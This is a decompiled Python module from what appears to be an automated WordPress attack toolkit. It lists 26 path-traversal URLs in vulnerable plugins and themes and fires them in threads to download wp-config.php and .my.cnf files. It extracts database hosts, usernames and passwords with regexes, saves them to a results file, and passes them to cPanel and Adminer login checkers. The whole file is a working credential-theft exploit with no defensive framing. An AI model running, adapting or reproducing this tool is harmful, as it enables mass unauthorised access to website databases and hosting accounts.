#Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
import requests
import re
import threading
import time
from Exploits import printModule
from Tools import cpanel
from Exploits import adminer
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
DowloadConfig = [
 '/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php',
 '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
 '/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php',
 '/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php',
 '/wp-admin/admin-ajax.php?action=cpabc_appointments_calendar_update&cpabc_calendar_update=1&id=../../../../../../wp-config.php',
 '/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes',
 '/wp-admin/admin.php?page=multi_metabox_listing&action=edit&id=../../../../../../wp-config.php',
 '/wp-content/force-download.php?file=../wp-config.php',
 '/force-download.php?file=wp-config.php',
 '/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php',
 '/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&file=../../../../wp-config.php',
 '/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php',
 '/wp-content/plugins/mini-mail-dashboard-widgetwp-mini-mail.php?abspath=../../wp-config.php',
 '/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=../../../../wp-config.php',
 '/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php',
 '/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../wp-config.php',
 '/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php',
 '/wp-content/plugins/tera-charts/charts/treemap.php?fn=../../../../wp-config.php',
 '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
 '/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php',
 '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php',
 '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/downloadAttachment.php?path=../../../../../wp-config.php',
 '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php',
 '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php',
 '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php',
 '/wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php']

def Attack(site, path):
    path1 = str(path).replace('wp-config.php', '../.my.cnf')
    try:
        G = requests.get('http://' + site + path1, timeout=7, headers=Headers)
        if 'user=' in str(G.content):
            Username = re.findall('user=(.*)', str(G.content))[0]
            Password = re.findall('password="(.*)"', str(G.content))[0]
            cpanel.Check(site, Username, Password)
    except:
        pass

    path2 = str(path).replace('wp-config.php', '../my.cnf')
    try:
        G = requests.get('http://' + site + path2, timeout=7, headers=Headers)
        if 'user=' in str(G.content):
            Username = re.findall('user=(.*)', str(G.content))[0]
            Password = re.findall('password="(.*)"', str(G.content))[0]
            cpanel.Check(site, Username, Password)
    except:
        pass


def Exploitz(site, path):
    global flag
    try:
        Exp = 'http://' + site + str(path)
        GetConfig = requests.get(Exp, timeout=10, headers=Headers)
        if 'DB_PASSWORD' in str(GetConfig.content):
            Attack(site, path)
            adminer.cConfigOK(site, site + path)
            flag = True
            try:
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                Gethost = re.findall("'DB_HOST', '(.*)'", str(GetConfig.content))
                Getuser = re.findall("'DB_USER', '(.*)'", str(GetConfig.content))
                Getpass = re.findall("'DB_PASSWORD', '(.*)'", str(GetConfig.content))
                Getdb = re.findall("'DB_NAME', '(.*)'", str(GetConfig.content))
                cpanel.Check(site, Getuser[0], Getpass[0])
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] + '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[0] + '\n---------------------\n')
            except:
                pass

    except:
        pass


def Exploit(site):
    global flag
    thread = []
    flag = False
    for path in DowloadConfig:
        if not flag == False:
            return printModule.returnYes(site, 'N/A', 'Config Download', 'Wordpress')
        t = threading.Thread(target=Exploitz, args=(site, path))
        t.start()
        thread.append(t)
        time.sleep(0.7)

    for j in thread:
        j.join()

    if flag == False:
        adminer.ConfigNo(site)
        return printModule.returnNo(site, 'N/A', 'Config Download', 'Wordpress')